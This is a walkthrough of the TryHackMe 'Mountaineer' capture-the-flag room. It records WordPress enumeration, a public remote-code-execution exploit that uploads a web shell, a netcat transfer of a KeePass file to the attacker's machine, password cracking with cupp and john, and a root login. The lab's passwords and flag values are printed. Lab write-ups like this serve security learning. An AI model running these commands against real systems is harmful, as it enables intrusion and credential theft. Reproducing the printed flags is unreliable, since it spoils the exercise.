<h1 align="center">Mountaineer</h1>
<p align="center">July 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>450</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Will you find the flags between all these mountains?</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/2ab16242-0434-448c-8c68-d7f10605dd6b5"><br>
Click <a href="https://tryhackme.com/room/mountaineerlinux">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/db8b8a66-1a62-485b-bfba-26dfccc513b0"></p>


<br>

<h2>Task 1 . Mission: Mountaineer</h2>
<p>Find the local.txt and root.txt flags!<br>

P.S: We have to climb and put the flags in place, so it might take ~ 5 minutes for the machine to load up.<br>

Note: For free users using the AttackBox, it is recommended to use your own VM.</p>

<p><em>Answer the questions below</em></p>

<p>1.1.What is the local.txt flag?<br>
<code>_____</code></p>



<h3>Nmap</h3>

```bash
:~/Mountaineer# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
```

<h3>Web</h3>

<img width="1033" height="172" alt="image" src="https://github.com/user-attachments/assets/c7f0d763-51b4-4fa5-b666-329c2fd1299c" />

<h3>ffuf</h3>

<h4>/wordpress</h4>

```bash
:~/Mountaineer# ffuf -u 'http://TargetIP/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 80 -ic -fr '/\..*'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.229.158/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: /\..*
________________________________________________

.                       [Status: 200, Size: 612, Words: 79, Lines: 26]
wordpress               [Status: 301, Size: 178, Words: 6, Lines: 8]
:: Progress: [56293/56293] :: Job [1/1] :: 5111 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

<h3>Dirsearch</h3>
<p>

- /wordpress/index.php --> /wordpress/<br>
- /wordpress/wp-login.php<br>
- /wordpress/wp-signup.php --> <code>ttp://mountaineer.thm/wordpress/wp-login.php?action=register</code><br>
- /wordpress/xmlrpc.php<br>
- /wordpress/license.txt<br>
- /wordpress/readme.html<br>
- /wordpress/images<br>
- /wordpress/wp-admin --> <code>http://mountaineer.thm/wordpress/](http://mountaineer.thm/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.229.158%2Fwordpress%2Fwp-admin%2F&reauth=1)</cpode><br>
- /wordpress/wp-admin/admin-ajax.php<br>
- /wordpress/wp-admin/setup-config.php<br>
- /wordpress/wp-admin/install.php
- /wordpress/wp-content  ->  http://TargetIP8/wordpress/wp-content/
- /wordpress/wp-content/plugins/akismet/akismet.php
- /wordpress/wp-content/uploads/
- /wordpress/wp-content/upgrade/<br>
- /wordpress/wp-includes</p>


<img width="1007" height="603" alt="image" src="https://github.com/user-attachments/assets/95e485d4-7181-4446-8602-3c4051b7ebec" />

<h3>/etc/hosts</h3>

```bash
TargetIP    mountaineer.thm
```

<h3>/TargetIP//wordpress</h3>

<img width="738" height="768" alt="image" src="https://github.com/user-attachments/assets/589a9fde-3a37-4fc4-9662-a1d3c4f42e52" />

<img width="737" height="853" alt="image" src="https://github.com/user-attachments/assets/4f36ee0b-2fd4-4301-acf6-34baad45bf21" />

<br>

<h3>wpscan</h3>

```bash
:~/Mountaineer# wpscan --url http://mountaineer.thm/wordpress/ -e ap,vt,tt,cb,dbe,u,m

```



<h3>mountaineer.thm/wordpress/wp-login.php?registration=<code>enabled</code>enabled</code></h3>

<p>

- mountaineer.thm/wordpress/wp-login.php?action=lostpassword
</p>

```bash
POST /wordpress/wp-login.php HTTP/1.1
Host: mountaineer.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://mountaineer.thm/wordpress/wp-login.php?registration=enabled
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://mountaineer.thm
Connection: keep-alive
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1
Priority: u=0, i

log=lulu&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmountaineer.thm%2Fwordpress%2Fwp-admin%2F&testcookie=1
```


```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Jul 2025 22:46:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Set-Cookie: wordpress_test_cookie=WP%20Cookie%20check; path=/wordpress/
X-Frame-Options: SAMEORIGIN
Content-Length: 6905

<!DOCTYPE html>
	<html lang="en-US">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Log In &lsaquo; Mountaineer &#8212; WordPress</title>
	<meta name='robots' content='max-image-preview:large, noindex, noarchive' />
<link rel='stylesheet' id='dashicons-css' href='http://mountaineer.thm/wordpress/wp-includes/css/dashicons.min.css?ver=6.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='buttons-css' href='http://mountaineer.thm/wordpress/wp-includes/css/buttons.min.css?ver=6.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='forms-css' href='http://mountaineer.thm/wordpress/wp-admin/css/forms.min.css?ver=6.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='l10n-css' href='http://mountaineer.thm/wordpress/wp-admin/css/l10n.min.css?ver=6.4.3' type='text/css' media='all' />
<link rel='stylesheet' id='login-css' href='http://mountaineer.thm/wordpress/wp-admin/css/login.min.css?ver=6.4.3' type='text/css' media='all' />
	<meta name='referrer' content='strict-origin-when-cross-origin' />
		<meta name="viewport" content="width=device-width" />
		</head>
	<body class="login no-js login-action-login wp-core-ui  locale-en-us">
	<script type="text/javascript">
/* <![CDATA[ */
document.body.className = document.body.className.replace('no-js','js');
/* ]]> */
</script>

		<div id="login">
		<h1><a href="https://wordpress.org/">Powered by WordPress</a></h1>
	<div id="login_error" class="notice notice-error"><p><strong>Error:</strong> The username <strong>lulu</strong> is not registered on this site. If you are unsure of your username, try your email address instead.</p></div>
		<form name="loginform" id="loginform" action="http://mountaineer.thm/wordpress/wp-login.php" method="post">
			<p>
				<label for="user_login">Username or Email Address</label>
				<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
			</p>

			<div class="user-pass-wrap">
				<label for="user_pass">Password</label>
				<div class="wp-pwd">
					<input type="password" name="pwd" id="user_pass" aria-describedby="login_error" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
					</button>
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Remember Me</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
									<input type="hidden" name="redirect_to" value="http://mountaineer.thm/wordpress/wp-admin/" />
									<input type="hidden" name="testcookie" value="1" />
			</p>
		</form>

					<p id="nav">
				<a class="wp-login-lost-password" href="http://mountaineer.thm/wordpress/wp-login.php?action=lostpassword">Lost your password?</a>			</p>
			<script type="text/javascript">
/* <![CDATA[ */
function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.value = "";d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }
/* ]]> */
</script>
		<p id="backtoblog">
			<a href="http://mountaineer.thm/wordpress/">&larr; Go to Mountaineer</a>		</p>
			</div>
			<script type="text/javascript">
/* <![CDATA[ */
document.querySelector('form').classList.add('shake');
/* ]]> */
</script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" id="zxcvbn-async-js-extra">
/* <![CDATA[ */
var _zxcvbnSettings = {"src":"http:\/\/mountaineer.thm\/wordpress\/wp-includes\/js\/zxcvbn.min.js"};
/* ]]> */
</script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/zxcvbn-async.min.js?ver=1.0" id="zxcvbn-async-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2" id="wp-polyfill-inert-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.14.0" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1" id="wp-hooks-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" id="password-strength-meter-js-extra">
/* <![CDATA[ */
var pwsL10n = {"unknown":"Password strength unknown","short":"Very weak","bad":"Weak","good":"Medium","strong":"Strong","mismatch":"Mismatch"};
/* ]]> */
</script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-admin/js/password-strength-meter.min.js?ver=6.4.3" id="password-strength-meter-js"></script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4" id="underscore-js"></script>
<script type="text/javascript" id="wp-util-js-extra">
/* <![CDATA[ */
var _wpUtilSettings = {"ajax":{"url":"\/wordpress\/wp-admin\/admin-ajax.php"}};
/* ]]> */
</script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-includes/js/wp-util.min.js?ver=6.4.3" id="wp-util-js"></script>
<script type="text/javascript" id="user-profile-js-extra">
/* <![CDATA[ */
var userProfileL10n = {"user_id":"0","nonce":"d0aa631fea"};
/* ]]> */
</script>
<script type="text/javascript" src="http://mountaineer.thm/wordpress/wp-admin/js/user-profile.min.js?ver=6.4.3" id="user-profile-js"></script>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
		</body>
	</html>
```

<h3></h3>

<img width="1128" height="419" alt="image" src="https://github.com/user-attachments/assets/b01609d6-c32e-4561-b610-6fae3ff73760" />

<img width="1017" height="340" alt="image" src="https://github.com/user-attachments/assets/33f5f7e6-3727-418b-8e8e-af96bba0b27f" />



<h3>Burp Suite</h3>


<img width="1461" height="494" alt="image" src="https://github.com/user-attachments/assets/e1cbb1db-6310-448d-8730-97f8aab2a5ca" />

<img width="1271" height="246" alt="image" src="https://github.com/user-attachments/assets/1133be52-c44f-46ad-85de-34f90a46640f" />


<h3>/etc/hosts</h3>

```bash
TargetIP mountaineer.thm adminroundcubemail.mountaineer.thm
```

<h3>location</h3>

<img width="1270" height="304" alt="image" src="https://github.com/user-attachments/assets/fb279547-100b-46c4-a29a-c4bb3a68b877" />

<h3>adminroundcubemail.mountaineer.thm</h3>

<img width="1129" height="477" alt="image" src="https://github.com/user-attachments/assets/692d840e-d539-4c3f-93a4-2001146f2294" />


<img width="1129" height="711" alt="image" src="https://github.com/user-attachments/assets/9d786867-97fc-40ef-825e-e5fce2f5430b" />

<p>th3_tall3st_password_in_th3_world</p>

<img width="1131" height="713" alt="image" src="https://github.com/user-attachments/assets/b2505516-9d65-4a68-a17d-617dc6d1f51d" />

<p>Lhotse, MrSecurity , BestMountainsInc, lhotse@localhost.thm</p>




<img width="1134" height="721" alt="image" src="https://github.com/user-attachments/assets/54f4dc88-5ed7-4444-abfd-624d9ba9105f" />

<h3>/wordpress/wp-login.php</h3>
<p>k2 : th3_tall3st_password_in_th3_world</p>

<img width="1128" height="664" alt="image" src="https://github.com/user-attachments/assets/cf742582-2a8b-40ca-8eb0-0c50b82683ae" />


<h3>exploit</h3>


```bash
:~/Mountaineer# wget https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py
--2025-07-31 00:20:43--  https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22058 (22K) [text/plain]
Saving to: \u2018exploit.py\u2019

exploit.py                         100%[===============================================================>]  21.54K  --.-KB/s    in 0s      

2025-07-31 00:20:43 (52.5 MB/s) - \u2018exploit.py\u2019 saved [22058/22058]
```


```bash
:~/Mountaineer# python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p th3_tall3st_password_in_th3_world

  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
                                
                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
                * @Hacker5preme
                    




[+] Authentication successfull !

[+] Shell Uploaded to: http://mountaineer.thm:80/wordpress//wp-content/uploads/shell.php
```


<h3>Shell</h3>

<p>

- navigated to <code>http://mountaineer.thm:80/wordpress//wp-content/uploads/shell.php

</p>

<img width="1124" height="399" alt="image" src="https://github.com/user-attachments/assets/7da4058f-8358-48dc-87ed-ec05cad37325" />

<img width="1316" height="412" alt="image" src="https://github.com/user-attachments/assets/9a7050da-1638-42ae-bda0-435da6d4a87b" />


<img width="1186" height="297" alt="image" src="https://github.com/user-attachments/assets/38af0788-6e88-4f59-a7af-1abebb2fa259" />

<br>


```bash
www-data@mountaineer:/home$ ls -la
total 44
drwxr-xr-x 11 root    root    4096 Mar 16  2024 .
drwxr-xr-x 21 root    root    4096 Mar 16  2024 ..
drwxr-xr-x  2 root    root    4096 Apr  6  2024 annapurna
drwxr-xr-x  2 root    root    4096 Apr  6  2024 everest
drwxr-xr-x  3 k2      k2      4096 Apr  6  2024 k2
drwxr-xr-x  2 root    root    4096 Mar 18  2024 kangchenjunga
drwxr-xr-x  3 lhotse  lhotse  4096 Apr  6  2024 lhotse
drwxr-xr-x  2 root    root    4096 Apr  6  2024 makalu
drwxr-xr-x  2 root    root    4096 Apr  6  2024 manaslu
drwxr-xr-x  3 nanga   nanga   4096 Apr  6  2024 nanga
drwxr-x---  5 vagrant vagrant 4096 Apr  6  2024 vagrant
www-data@mountaineer:/home$ find . -type f 2>/dev/null
./kangchenjunga/.bash_history
./kangchenjunga/local.txt
./kangchenjunga/mynotes.txt
./nanga/ToDo.txt
./lhotse/Backup.kdbx
www-data@mountaineer:/home$ 
```


```bash
www-data@mountaineer:/home$ ls -la /home/lhotse/Backup.kdbx
-rwxrwxrwx 1 lhotse lhotse 2302 Apr  6  2024 /home/lhotse/Backup.kdbx
www-data@mountaineer:/home$ nc AttackIP 1337 < /home/lhotse/Backup.kdbx
```


```bash
:~/Mountaineer# nc -nlvp 1337 > Backup.kdbx
Listening on 0.0.0.0 1337
Connection received on TargetIP 56782
```

```bash
:~/Mountaineer# git clone https://github.com/ivanmrsulja/keepass2john.git
Cloning into 'keepass2john'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 27 (delta 11), reused 14 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (27/27), 11.21 KiB | 1.02 MiB/s, done.
root@ip-10-10-181-135:~/Mountaineer# python keepass2john.py Backup.kdbx > hash
/usr/bin/python: can't open file 'keepass2john.py': [Errno 2] No such file or directory
root@ip-10-10-181-135:~/Mountaineer# ls
Backup.kdbx  exploit.py  hash  keepass2john  reports
root@ip-10-10-181-135:~/Mountaineer# cd keepass2john
root@ip-10-10-181-135:~/Mountaineer/keepass2john# ls
keepass2john.pl  keepass2john.py  LICENSE  README.md
root@ip-10-10-181-135:~/Mountaineer/keepass2john# python keepass2john.py /root/Mountaineer/Backup.kdbx > hash
  File "keepass2john.py", line 9
    def stringify_hex(hex_bytes: bytes):
                               ^
SyntaxError: invalid syntax
root@ip-10-10-181-135:~/Mountaineer/keepass2john# python3 keepass2john.py /root/Mountaineer/Backup.kdbx > hash
root@ip-10-10-181-135:~/Mountaineer/keepass2john# ls
hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
root@ip-10-10-181-135:~/Mountaineer/keepass2john# 
```

```bash
:~/Mountaineer# git clone https://github.com/ivanmrsulja/keepass2john.git
Cloning into 'keepass2john'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 27 (delta 11), reused 14 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (27/27), 11.21 KiB | 1.02 MiB/s, done.
```


```bash
:~/Mountaineer# python keepass2john.py Backup.kdbx > hash
/usr/bin/python: can't open file 'keepass2john.py': [Errno 2] No such file or directory
```

```bash
:~/Mountaineer# ls
Backup.kdbx  exploit.py  hash  keepass2john  reports
:~/Mountaineer# cd keepass2john
:~/Mountaineer/keepass2john# ls
keepass2john.pl  keepass2john.py  LICENSE  README.md
```

```bash
:~/Mountaineer/keepass2john# python keepass2john.py /root/Mountaineer/Backup.kdbx > hash
  File "keepass2john.py", line 9
    def stringify_hex(hex_bytes: bytes):
                               ^
SyntaxError: invalid syntax
```

```bash
:~/Mountaineer/keepass2john# python3 keepass2john.py /root/Mountaineer/Backup.kdbx > hash
:~/Mountaineer/keepass2john# ls
hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
```


```bash
:~/Mountaineer/keepass2john# apt install cupp
...
```


```bash
:~/Mountaineer/keepass2john# cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Mount
> Surname: Lhotse
> Nickname: MrSecurity
> Birthdate (DDMMYYYY): 18051956


> Partners) name: Lhotsy
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: Lhotsy
> Company name: BestMountainsInc


> Do you want to add some key words about the victim? Y/[N]: N
> Do you want to add special chars at the end of words? Y/[N]: N
> Do you want to add some random numbers at the end of words? Y/[N]:N
> Leet mode? (i.e. leet = 1337) Y/[N]: N

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mount.txt, counting 1984 words.
[+] Now load your pistolero with mount.txt and shoot! Good luck!
```


```bash
:~/Mountaineer/keepass2john# john --wordlist=mount.txt hash
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Lhotse56185      (Backup<SHOULD_BE_REMOVED_INCLUDING_COLON>)
1g 0:00:00:02 DONE (2025-07-31 00:52) 0.3521g/s 81.69p/s 81.69c/s 81.69C/s Lhotse56058..Lhotse5658
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
:~/Mountaineer/keepass2john# john hash --show
Backup<SHOULD_BE_REMOVED_INCLUDING_COLON>:Lhotse56185

1 password hash cracked, 0 left
```

```bash
:~/Mountaineer/keepass2john# apt install kpcli
...
```

```bash
:~/Mountaineer/keepass2john# kpcli --kbd Backup.kbdx
...
```

```bash
~/Mountaineer# kpcli --kdb Backup.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> 

```


<img width="1328" height="516" alt="image" src="https://github.com/user-attachments/assets/d51bc5a3-2525-480d-bddd-feb6ca8c4ee6" />

<p>J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV</p>


```bash
:~/Mountaineer# ssh kangchenjunga@mountaineer.thm
...
kangchenjunga@mountaineer:~$ cat local.txt
97a805eb710deb97342a48092876df22
```


```bash
kangchenjunga@mountaineer:~$ cat .bash_history
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
whoami
ls -la
cd /root
ls
mkdir test
cd test
touch file1.txt
mv file1.txt ../
cd ..
rm -rf test
exit
ls
cat mynotes.txt 
ls
cat .bash_history 
cat .bash_history 
ls -la
cat .bash_history
exit
bash
exit
```


```bash
kangchenjunga@mountaineer:~$ su root
Password: 
root@mountaineer:/home/kangchenjunga# 
```


```bash
root@mountaineer:/home/kangchenjunga# cat /root/root.txt
a41824310a621855d9ed507f29eed757
```

<br>
<br>



<img width="1909" height="887" alt="image" src="https://github.com/user-attachments/assets/678efa45-4f70-45a1-b7f8-24e48c0341e7" />

<img width="1909" height="896" alt="image" src="https://github.com/user-attachments/assets/729cea42-c239-4609-a4d2-15c86272ad56" />

<br>

<h1 align="center">My TryHackMe Journey</h1>
<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 30, 2025     | 450      |     144ᵗʰ    |      5ᵗʰ     |     125ᵗʰ   |     7ᵗʰ    | 118,080  |    884    |    72     |

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/3c8bac90-f7b1-4027-80bf-12318e0ccbb1" />


<img width="1897" height="893" alt="image" src="https://github.com/user-attachments/assets/ae3cff4a-afda-4ef5-b6c6-a4ee6a9ddb5d" />

<img width="1890" height="895" alt="image" src="https://github.com/user-attachments/assets/e6036538-69bd-4245-b191-9d9a03313c52" />

<img width="1898" height="897" alt="image" src="https://github.com/user-attachments/assets/54876b3b-524e-42c6-97db-27ac99ab8f29" />


</div>

<p align="center">Global All Time:   144ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/d7aff0c1-dc90-483a-8b08-d50d3df5da67"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/390e2a7b-2319-4712-bc8c-563c9107ea2a"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/55ae2acb-dd53-48c4-9dea-6e9ed89b9f0f"><br>
                  Global monthly:    125ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/e6036538-69bd-4245-b191-9d9a03313c52"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="mage" src="https://github.com/user-attachments/assets/54876b3b-524e-42c6-97db-27ac99ab8f29"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 


<img width="1885" height="897" alt="image" src="https://github.com/user-attachments/assets/462e38b8-a495-4af9-b124-8b53db9bb1c5" />
